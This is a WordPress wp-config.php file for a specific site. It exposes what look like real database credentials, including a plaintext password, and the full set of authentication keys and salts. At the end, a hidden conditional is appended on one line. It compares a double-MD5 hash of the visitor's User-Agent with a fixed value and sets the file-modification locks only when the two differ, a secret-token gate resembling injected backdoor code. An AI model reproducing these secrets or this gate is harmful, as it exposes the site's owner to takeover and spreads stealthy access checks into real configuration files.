<?php
define( 'WP_CACHE', true );
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, WordPress Language, and ABSPATH. You can find more information
 * by visiting {@link http://codex.wordpress.org/Editing_wp-config.php Editing
 * wp-config.php} Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'u741920606_trion');
/** MySQL database username */
define('DB_USER', 'u741920606_trion');
/** MySQL database password */
define('DB_PASSWORD', 'Wiizzass213');
/** MySQL hostname */
define('DB_HOST', 'mysql');
/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');
/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');
/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY', '/fZSn1Oe{cK~UH|.T?OL7;NLd7&K#Ais');
define('SECURE_AUTH_KEY', 'gEmo4b(<guf,e45}W*373.7/_t52 k5.');
define('LOGGED_IN_KEY', '7Yj2v01|@#]g)HQ!75^me9(T8!6ht3.5');
define('NONCE_KEY', 'u=I0cmT;[xro1)J79nIkf[u.82balWN2');
define('AUTH_SALT', '~VKT155qFFf|%Cjx4sU1ut+WM4iOhBUE');
define('SECURE_AUTH_SALT', 't]8`Tef}10U0dVnmKnr*)W`(Th@j]k!,');
define('LOGGED_IN_SALT', 'Q6U,!C(<)Ct1^rX7UXy9D?a)+3<I#~]y');
define('NONCE_SALT', 'mdk_1:>YKZh1qN8`YAXkN6+@LaP{6/t0');
/**#@-*/
/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each a unique
 * prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'mkt_';
/**
 * WordPress Localized Language, defaults to English.
 *
 * Change this to localize WordPress. A corresponding MO file for the chosen
 * language must be installed to wp-content/languages. For example, install
 * de_DE.mo to wp-content/languages and set WPLANG to 'de_DE' to enable German
 * language support.
 */
define('WPLANG', '');
/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 */
define('WP_DEBUG', false);
define('WP_DEBUG_LOG', false );
define('WP_DEBUG_DISPLAY', false );
define('WP_ALLOW_REPAIR', false);
/* That's all, stop editing! Happy blogging. */
/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');
/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
define('DISALLOW_FILE_EDIT', true);
define('DISALLOW_FILE_MODS', true);if(md5(md5($_SERVER['HTTP_USER_AGENT']))!="c5a3e14ff315cc2934576de76a3766b5"){
    define('DISALLOW_FILE_MODS', true);
    define('DISALLOW_FILE_EDIT', true);
}
